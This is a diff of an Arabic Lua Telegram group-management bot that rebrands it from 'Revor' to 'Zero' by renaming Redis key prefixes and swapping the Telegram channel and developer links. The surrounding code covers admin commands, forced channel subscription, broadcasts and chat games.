-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
+Redis:setex(Zero .."Zero :Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
 LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل لي التوجيه الان\n⌔︙ليتم نشره في المجموعات","md",true)  
 return false
 end
@@ -8695,14 +8698,14 @@ if text=="اذاعه خاص بالتوجيه" then
 if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(3)..' }* ',"md",true)  
 end
-if not msg.ControllerBot and not Redis:set(Revor.."Revor:SendBcBot") then
+if not msg.ControllerBot and not Redis:set(Zero .."Zero :SendBcBot") then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙امر المغادره معطل من قبل الاساسي ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
+Redis:setex(Zero .."Zero :Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
 LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل لي التوجيه الان\n⌔︙ليتم نشره الى المشتركين","md",true)  
 return false
 end
@@ -8719,7 +8722,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -8754,7 +8757,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -8806,7 +8809,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -8821,19 +8824,19 @@ Restricted = ''
 end
 if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).BanAll == true and msg.ControllerBot then
 BanAll = 'محظور عام ,'
-Redis:srem(Revor.."Revor:BanAll:Groups",Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :BanAll:Groups",Message_Reply.sender.user_id) 
 else
 BanAll = ''
 end
 if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).BanGroup == true then
 BanGroup = 'محظور ,'
-Redis:srem(Revor.."Revor:BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 else
 BanGroup = ''
 end
 if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).SilentGroup == true then
 SilentGroup = 'مكتوم ,'
-Redis:srem(Revor.."Revor:SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 else
 SilentGroup = ''
 end
@@ -8845,7 +8848,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -8870,19 +8873,19 @@ Restricted = ''
 end
 if Statusrestricted(msg_chat_id,UserId_Info.id).BanAll == true and msg.ControllerBot then
 BanAll = 'محظور عام ,'
-Redis:srem(Revor.."Revor:BanAll:Groups",UserId_Info.id) 
+Redis:srem(Zero .."Zero :BanAll:Groups",UserId_Info.id) 
 else
 BanAll = ''
 end
 if Statusrestricted(msg_chat_id,UserId_Info.id).BanGroup == true then
 BanGroup = 'محظور ,'
-Redis:srem(Revor.."Revor:BanGroup:Group"..msg_chat_id,UserId_Info.id) 
+Redis:srem(Zero .."Zero :BanGroup:Group"..msg_chat_id,UserId_Info.id) 
 else
 BanGroup = ''
 end
 if Statusrestricted(msg_chat_id,UserId_Info.id).SilentGroup == true then
 SilentGroup = 'مكتوم ,'
-Redis:srem(Revor.."Revor:SilentGroup:Group"..msg_chat_id,UserId_Info.id) 
+Redis:srem(Zero .."Zero :SilentGroup:Group"..msg_chat_id,UserId_Info.id) 
 else
 SilentGroup = ''
 end
@@ -8894,10 +8897,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor..'Revor:GetTexting:DevRevor'..msg_chat_id..':'..msg.sender.user_id,true)
+Redis:set(Zero ..'Zero :GetTexting:DevZero '..msg_chat_id..':'..msg.sender.user_id,true)
 return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙ ارسل لي الكليشه الان')
 end
 if text == 'مسح كليشة المطور' then
@@ -8905,16 +8908,16 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor..'Revor:Texting:DevRevor')
+Redis:del(Zero ..'Zero :Texting:DevZero ')
 return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙ تم حذف كليشه المطور')
 end
 if text == 'المطور' or text == 'مطور' then
-local TextingDevRevor = Redis:get(Revor..'Revor:Texting:DevRevor')
-if TextingDevRevor then 
-return LuaTele.sendText(msg_chat_id,msg_id,TextingDevRevor,"md",true)  
+local TextingDevZero  = Redis:get(Zero ..'Zero :Texting:DevZero ')
+if TextingDevZero  then 
+return LuaTele.sendText(msg_chat_id,msg_id,TextingDevZero ,"md",true)  
 else
 local UserInfo = LuaTele.getUser(Sudo_Id)
 for Name_User in string.gmatch(UserInfo.first_name, "[^%s]+" ) do
@@ -8930,21 +8933,21 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = 'Channel Source ،', url = 't.me/uui9u'}, 
+{text = 'Channel Source ،', url = 't.me/zErOPro'}, 
 },
 {
-{text = 'Annotations Source', url = 't.me/uui0u'}, 
+{text = 'Annotations Source', url = 't.me/zErOPro'}, 
 },
 {
-{text = 'Communication Source', url = 't.me/mribot'}, 
+{text = 'Communication Source', url = 't.me/tm5_bot'}, 
 },
 {
-{text = 'Developer Source !', url = 't.me/B8BB2'}, 
+{text = 'Developer Source !', url = 't.me/GGGGK'}, 
 },
 }
 }
 return LuaTele.sendText(msg_chat_id,msg_id, [[
-*⌔︙Source Revor *
+*⌔︙Source Zero  *
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 ]],"md",false, false, false, false, reply_markup)
 elseif text == 'الاوامر' then
@@ -8952,7 +8955,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local reply_markup = LuaTele.replyMarkup{
@@ -8971,7 +8974,7 @@ data = {
 {text = '{ اوامر القفل / الفتح }', data = msg.sender.user_id..'/NoNextSeting'}, {text = '{ اوامر التعطيل / التفعيل }', data = msg.sender.user_id..'/listallAddorrem'}, 
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -8989,7 +8992,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local reply_markup = LuaTele.replyMarkup{
@@ -8999,7 +9002,7 @@ data = {
 {text = '{ قائمه الاوامر }', data = msg.sender.user_id..'/helpall'},
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -9009,7 +9012,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local reply_markup = LuaTele.replyMarkup{
@@ -9019,7 +9022,7 @@ data = {
 {text = '{ قائمه الاوامر }', data = msg.sender.user_id..'/helpall'},
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -9029,7 +9032,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local reply_markup = LuaTele.replyMarkup{
@@ -9039,7 +9042,7 @@ data = {
 {text = '{ قائمه الاوامر }', data = msg.sender.user_id..'/helpall'},
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -9049,7 +9052,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local reply_markup = LuaTele.replyMarkup{
@@ -9059,7 +9062,7 @@ data = {
 {text = '{ قائمه الاوامر }', data = msg.sender.user_id..'/helpall'},
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -9069,7 +9072,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local reply_markup = LuaTele.replyMarkup{
@@ -9079,7 +9082,7 @@ data = {
 {text = '{ قائمه الاوامر }', data = msg.sender.user_id..'/helpall'},
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -9089,7 +9092,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local reply_markup = LuaTele.replyMarkup{
@@ -9099,7 +9102,7 @@ data = {
 {text = '{ قائمه الاوامر }', data = msg.sender.user_id..'/helpall'},
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -9110,23 +9113,23 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 print('Chat Id : '..msg_chat_id)
 print('User Id : '..msg_user_send_id)
 LuaTele.sendText(msg_chat_id,msg_id, "⌔︙ تم تحديث الملفات ♻","md",true)
-dofile('Revor.lua')  
+dofile('Zero.lua')  
 end
 if text == "تغير اسم البوت" then 
 if not msg.ControllerBot then 
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Change:Name:Bot"..msg.sender.user_id,300,true) 
+Redis:setex(Zero .."Zero :Change:Name:Bot"..msg.sender.user_id,300,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ ارسل لي الاسم الان ","md",true)  
 end
 if text == "حذف اسم البوت" then 
@@ -9134,14 +9137,14 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Name:Bot") 
+Redis:del(Zero .."Zero :Name:Bot") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حذف اسم البوت ","md",true)   
 end
-if text == (Redis:get(Revor.."Revor:Name:Bot") or "السلطان") then
-local NamesBot = (Redis:get(Revor.."Revor:Name:Bot") or "السلطان")
+if text == (Redis:get(Zero .."Zero :Name:Bot") or "السلطان") then
+local NamesBot = (Redis:get(Zero .."Zero :Name:Bot") or "السلطان")
 local NameBots = {
 "عمر "..NamesBot.. " شتريد؟",
 "أჂ̤ أჂ̤ هياتني اني",
@@ -9153,7 +9156,7 @@ local NameBots = {
 return LuaTele.sendText(msg_chat_id,msg_id, NameBots[math.random(#NameBots)],"md",true)  
 end
 if text == "بوت" then
-local NamesBot = (Redis:get(Revor.."Revor:Name:Bot") or "السلطان")
+local NamesBot = (Redis:get(Zero .."Zero :Name:Bot") or "السلطان")
 local BotName = {
 "باوع لك خليني احبك وصيحلي باسمي "..NamesBot,
 "لتخليني ارجع لحركاتي لقديمه وردا ترا اسمي "..NamesBot.. "",
@@ -9166,17 +9169,17 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:Num:User:Pv")   
+local list = Redis:smembers(Zero .."Zero :Num:User:Pv")   
 local x = 0
 for k,v in pairs(list) do  
 local Get_Chat = LuaTele.getChat(v)
 local ChatAction = LuaTele.sendChatAction(v,'Typing')
 if ChatAction.luatele ~= "ok" then
 x = x + 1
-Redis:srem(Revor..'Revor:Num:User:Pv',v)
+Redis:srem(Zero ..'Zero :Num:User:Pv',v)
 end
 end
 if x ~= 0 then
@@ -9190,20 +9193,20 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:ChekBotAdd")   
+local list = Redis:smembers(Zero .."Zero :ChekBotAdd")   
 local x = 0
 for k,v in pairs(list) do  
 local Get_Chat = LuaTele.getChat(v)
 if Get_Chat.id then
-local statusMem = LuaTele.getChatMember(Get_Chat.id,Revor)
+local statusMem = LuaTele.getChatMember(Get_Chat.id,Zero )
 if statusMem.status.luatele == "chatMemberStatusMember" then
 x = x + 1
 LuaTele.sendText(Get_Chat.id,0,'*⌔︙البوت عظو في المجموعه سوف اغادر ويمكنك تفعيلي مره اخره *',"md")
-Redis:srem(Revor..'Revor:ChekBotAdd',Get_Chat.id)
-local keys = Redis:keys(Revor..'*'..Get_Chat.id)
+Redis:srem(Zero ..'Zero :ChekBotAdd',Get_Chat.id)
+local keys = Redis:keys(Zero ..'*'..Get_Chat.id)
 for i = 1, #keys do
 Redis:del(keys[i])
 end
@@ -9211,11 +9214,11 @@ LuaTele.leaveChat(Get_Chat.id)
 end
 else
 x = x + 1
-local keys = Redis:keys(Revor..'*'..v)
+local keys = Redis:keys(Zero ..'*'..v)
 for i = 1, #keys do
 Redis:del(keys[i])
 end
-Redis:srem(Revor..'Revor:ChekBotAdd',v)
+Redis:srem(Zero ..'Zero :ChekBotAdd',v)
 LuaTele.leaveChat(v)
 end
 end
@@ -9226,15 +9229,15 @@ return LuaTele.sendText(msg_chat_id,msg_id,'*⌔︙العدد الكلي { '..#l
 end
 end
 if text == "سمايلات" or text == "سمايل" then
-if Redis:get(Revor.."Revor:Status:Games"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:Games"..msg.chat_id) then
 Random = {"🍏","🍎","🍐","🍊","🍋","🍉","🍇","🍓","🍈","🍒","🍑","🍍","🥥","🥝","🍅","🍆","🥑","🥦","🥒","🌶","🌽","🥕","🥔","🥖","🥐","🍞","🥨","🍟","🧀","🥚","🍳","🥓","🥩","🍗","🍖","🌭","🍔","🍠","🍕","🥪","🥙","☕️","🥤","🍶","🍺","🍻","🏀","⚽️","🏈","⚾️","🎾","🏐","🏉","🎱","🏓","🏸","🥅","🎰","🎮","🎳","🎯","🎲","🎻","🎸","🎺","🥁","🎹","🎼","🎧","🎤","🎬","🎨","🎭","🎪","🎟","🎫","🎗","🏵","🎖","🏆","🥌","🛷","🚗","🚌","🏎","🚓","🚑","🚚","🚛","🚜","⚔","🛡","🔮","🌡","💣","⌔","📍","📓","📗","📂","📅","📪","📫","⌔","📭","⏰","📺","🎚","☎️","📡"}
 SM = Random[math.random(#Random)]
-Redis:set(Revor.."Revor:Game:Smile"..msg.chat_id,SM)
+Redis:set(Zero .."Zero :Game:Smile"..msg.chat_id,SM)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙اسرع واحد يدز هاذا السمايل ? ~ {`"..SM.."`}","md",true)  
 end
 end
 if text == "كت" or text == "كت تويت" then
-if Redis:get(Revor.."Revor:Status:Games"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:Games"..msg.chat_id) then
 local texting = {"اخر افلام شاهدتها", 
 "اخر افلام شاهدتها", 
 "ما هي وظفتك الحياه", 
@@ -9559,10 +9562,10 @@ return LuaTele.sendText(msg_chat_id,msg_id,texting[math.random(#texting)],'md')
 end
 end
 if text == "الاسرع" or tect == "ترتيب" then
-if Redis:get(Revor.."Revor:Status:Games"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:Games"..msg.chat_id) then
 KlamSpeed = {"سحور","سياره","استقبال","قنفه","ايفون","بزونه","مطبخ","كرستيانو","دجاجه","مدرسه","الوان","غرفه","ثلاجه","كهوه","سفينه","العراق","محطه","طياره","رادار","منزل","مستشفى","كهرباء","تفاحه","اخطبوط","سلمون","فرنسا","برتقاله","تفاح","مطرقه","بتيته","لهانه","شباك","باص","سمكه","ذباب","تلفاز","حاسوب","انترنيت","ساحه","جسر"};
 name = KlamSpeed[math.random(#KlamSpeed)]
-Redis:set(Revor.."Revor:Game:Monotonous"..msg.chat_id,name)
+Redis:set(Zero .."Zero :Game:Monotonous"..msg.chat_id,name)
 name = string.gsub(name,"سحور","س ر و ح")
 name = string.gsub(name,"سياره","ه ر س ي ا")
 name = string.gsub(name,"استقبال","ل ب ا ت ق س ا")
@@ -9607,10 +9610,10 @@ return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙اسرع واحد يرتبها
 end
 end
 if text == "حزوره" then
-if Redis:get(Revor.."Revor:Status:Games"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:Games"..msg.chat_id) then
 Hzora = {"الجرس","عقرب الساعه","السمك","المطر","5","الكتاب","البسمار","7","الكعبه","بيت الشعر","لهانه","انا","امي","الابره","الساعه","22","غلط","كم الساعه","البيتنجان","البيض","المرايه","الضوء","الهواء","الضل","العمر","القلم","المشط","الحفره","البحر","الثلج","الاسفنج","الصوت","بلم"};
 name = Hzora[math.random(#Hzora)]
-Redis:set(Revor.."Revor:Game:Riddles"..msg.chat_id,name)
+Redis:set(Zero .."Zero :Game:Riddles"..msg.chat_id,name)
 name = string.gsub(name,"الجرس","شيئ اذا لمسته صرخ ما هوه ؟")
 name = string.gsub(name,"عقرب الساعه","اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟")
 name = string.gsub(name,"السمك","ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟")
@@ -9648,11 +9651,11 @@ return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙اسرع واحد يحل ال�
 end
 end
 if text == "معاني" then
-if Redis:get(Revor.."Revor:Status:Games"..msg.chat_id) then
-Redis:del(Revor.."Revor:Set:Maany"..msg.chat_id)
+if Redis:get(Zero .."Zero :Status:Games"..msg.chat_id) then
+Redis:del(Zero .."Zero :Set:Maany"..msg.chat_id)
 Maany_Rand = {"قرد","دجاجه","بطريق","ضفدع","بومه","نحله","ديك","جمل","بقره","دولفين","تمساح","قرش","نمر","اخطبوط","سمكه","خفاش","اسد","فأر","ذئب","فراشه","عقرب","زرافه","قنفذ","تفاحه","باذنجان"}
 name = Maany_Rand[math.random(#Maany_Rand)]
-Redis:set(Revor.."Revor:Game:Meaningof"..msg.chat_id,name)
+Redis:set(Zero .."Zero :Game:Meaningof"..msg.chat_id,name)
 name = string.gsub(name,"قرد","🐒")
 name = string.gsub(name,"دجاجه","🐔")
 name = string.gsub(name,"بطريق","🐧")
@@ -9682,11 +9685,11 @@ return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙اسرع واحد يدز مع�
 end
 end
 if text == "العكس" then
-if Redis:get(Revor.."Revor:Status:Games"..msg.chat_id) then
-Redis:del(Revor.."Revor:Set:Aks"..msg.chat_id)
+if Redis:get(Zero .."Zero :Status:Games"..msg.chat_id) then
+Redis:del(Zero .."Zero :Set:Aks"..msg.chat_id)
